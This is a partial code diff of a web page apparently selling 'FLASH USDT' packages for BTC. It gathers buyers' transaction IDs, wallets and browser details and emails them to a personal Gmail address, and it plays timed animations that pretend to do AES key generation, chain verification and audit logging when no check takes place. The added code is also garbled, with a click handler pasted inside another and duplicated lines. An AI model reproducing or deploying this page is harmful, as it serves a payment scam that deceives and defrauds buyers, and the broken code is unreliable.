     if(!txt || txt==='—') return alert('No address to copy.');
@@ -527,7 +754,7 @@
     });
   });
 
-  // Next/Back
+  // Next / Back
   document.querySelectorAll('[data-next]').forEach(b=>{
     b.addEventListener('click', ()=>{
       const current = steps.find(s=>document.getElementById(s).style.display==='block');
@@ -554,10 +781,11 @@
     });
   });
 
-  // Methods
+  // Methods (BTC aktif)
   document.querySelectorAll('.method').forEach(m=>{
+    if(m.dataset.method === 'BTC') m.classList.add('active');
     m.addEventListener('click', ()=>{
-      if(m.dataset.closed){ return; }
+      if(m.dataset.closed) return;
       document.querySelectorAll('.method').forEach(x=>x.classList.remove('active'));
       m.classList.add('active');
       state.network = m.dataset.method;
@@ -580,27 +808,14 @@
     updateSummary();
   });
 
-  // AES Modal
-  const modal = $('#aesModal');
-  const st1 = $('#st1'), st2 = $('#st2'), st3 = $('#st3'), codeLine = $('#codeLine'), okMsg = $('#okMsg');
-  function resetModal(){ [st1,st2,st3].forEach(s=>s.classList.remove('active')); okMsg.style.display='none'; codeLine.textContent='[AES] init…'; }
-  function openModal(){ resetModal(); modal.style.display='flex'; modal.setAttribute('aria-hidden','false'); }
-  function closeModal(){ modal.style.display='none'; modal.setAttribute('aria-hidden','true'); }
-  $('#closeModal')?.addEventListener('click', closeModal);
-
-  function runAESSequence(){
-    openModal();
-    setTimeout(()=>{ st1.classList.add('active'); codeLine.textContent='[AES] generating key •••'; }, 200);
-    setTimeout(()=>{ st2.classList.add('active'); codeLine.textContent='[CHAIN] verifying BTC receipt •••'; }, 1200);
-    setTimeout(()=>{ st3.classList.add('active'); codeLine.textContent='[AUDIT] writing immutable log •••'; }, 2200);
-    setTimeout(()=>{ okMsg.style.display='block'; }, 3200);
-  }
-
-  // TXID send
-  $('#sendTxid')?.addEventListener('click', async ()=>{
-    const txid = ($('#txid')?.value || '').trim();
+  // TXID submit → Verify modal flow (ERC20 tarzı)
+  document.getElementById('sendTxid')?.addEventListener('click', async ()=>{
+    const txid = (document.getElementById('txid')?.value || '').trim();
     if(!txid){ alert('Please enter your TXID.'); return; }
+    state.txid = txid;
+    const p = document.getElementById('pending-txid'); if(p) p.textContent = txid;
 
+    // emailjs varsa gönder, yoksa mailto
     const subject = "FLASH USDT — New BTC Transaction";
     const body =
 `🔔 A new BTC transaction has been submitted
@@ -640,28 +855,59 @@ Chain Verification: Ready
         }
         await window.emailjs.send(EMAILJS.SERVICE_ID, EMAILJS.TEMPLATE_ID, {
           to_email: "eticin.60@gmail.com",
-          subject, package_name: state.productName || '—',
+          subject,
+          package_name: state.productName || '—',
           package_amount: state.productUSDT || '—',
           package_price: state.productPrice || '—',
           network: state.network || '—',
           pay_address: ADDRRSafe(state.network || ''),
           user_wallet: state.wallet || '—',
-          txid, user_agent: navigator.userAgent,
+          txid,
+          user_agent: navigator.userAgent,
           time: new Date().toLocaleString(),
           full_body: body
         });
         usedEmailJS = true;
+        alert("✅ TXID has been sent via EmailJS. Thank you!");
       }catch(e){ console.error(e); }
     }
-    if(!usedEmailJS){
-      const mailto = `mailto:eticin.60@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
-      window.location.href = mailto;
-    }
-    runAESSequence();
+// TXID submit → Verify modal flow (no email)
+document.getElementById('sendTxid')?.addEventListener('click', async () => {
+  const txid = (document.getElementById('txid')?.value || '').trim();
+  if (!txid) { alert('Please enter your TXID.'); return; }
+  state.txid = txid;
+  const p = document.getElementById('pending-txid');
+  if (p) p.textContent = txid;
+
+  // Modal akışı
+  openVerifyProcess();
+  setTimeout(() => { swapToPending(); }, 4000);
+});
+
+
+    // Modal akışı
+    openVerifyProcess();
+    setTimeout(()=>{ swapToPending(); }, 4000);
   });
 
   // Init
   showStep('step1'); toggleSummary(false); updateSummary();
+    
+    // === NAVIGATION SHORTCUTS ===
+document.querySelector('a[href="#steps"]')?.addEventListener('click', e => {
+  e.preventDefault();
+  showStep('step1');     // Product listesi
+  toggleSummary(false);
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+});
+
+document.querySelector('a[href="#verify"]')?.addEventListener('click', e => {
+  e.preventDefault();
+  showStep('step5');     // Verify Transaction kısmı
+  toggleSummary(false);
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+});
+
 </script>
 </body>
 </html>
